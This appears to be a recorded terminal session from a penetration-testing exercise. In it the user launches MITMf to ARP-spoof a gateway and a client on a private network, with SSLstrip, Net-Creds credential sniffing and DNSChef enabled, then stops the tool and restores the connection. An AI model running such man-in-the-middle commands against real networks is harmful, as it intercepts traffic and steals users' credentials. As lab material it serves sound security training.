@@ -1,0 +1,40 @@
+Script started on 2018-04-01 17:07:11-0300
+]0;prizefighter@prizefighter: ~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[01;31mprizefighter@prizefighter[00m:[01;34m~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[00m$ sudo mi tmf --arp --so[Kpoof 192[K[K[K--a[Kgateway 192.168.0.1 192.168.0.60 -i wlan0[1@-[1@-[1@t[1@e[1P[1@a[1@r[1@g[1@e[1@t[1@ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[sudo] password for prizefighter: 
+                                                    
+ __  __   ___   .--.          __  __   ___              
+|  |/  `.'   `. |__|         |  |/  `.'   `.      _.._  
+|   .-.  .-.   '.--.     .|  |   .-.  .-.   '   .' .._| 
+|  |  |  |  |  ||  |   .' |_ |  |  |  |  |  |   | '     
+|  |  |  |  |  ||  | .'     ||  |  |  |  |  | __| |__   
+|  |  |  |  |  ||  |'--.  .-'|  |  |  |  |  ||__   __|  
+|  |  |  |  |  ||  |   |  |  |  |  |  |  |  |   | |     
+|__|  |__|  |__||__|   |  |  |__|  |__|  |__|   | |     
+                       |  '.'                   | |     
+                       |   /                    | |     
+                       `'-'                     |_|
+
+[*] MITMf v0.9.8 - 'The Dark Side'
+|_ Spoof v0.6
+|  |_ ARP spoofing enabled
+|
+|_ Sergio-Proxy v0.2.1 online
+|_ SSLstrip v0.9 by Moxie Marlinspike online
+|
+|_ Net-Creds v1.0 online
+|_ MITMf-API online
+ * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)
+|_ HTTP server online
+|_ DNSChef v0.4 online
+|_ SMB server online
+
+    ^[[A^[[B^[[D^[[C^[[A                        ^C
+
+2018-04-01 17:22:52 [ARPpoisoner] Restoring connection 192.168.0.60 <-> 192.168.0.1 with 2 packets per host
+
+]0;prizefighter@prizefighter: ~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[01;31mprizefighter@prizefighter[00m:[01;34m~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[00m$ ls
+aprspoofImrouter  aprspoofImtgclient  mitmf
+]0;prizefighter@prizefighter: ~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[01;31mprizefighter@prizefighter[00m:[01;34m~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[00m$ exit
+exit
+
+Script done on 2018-04-01 17:23:04-0300
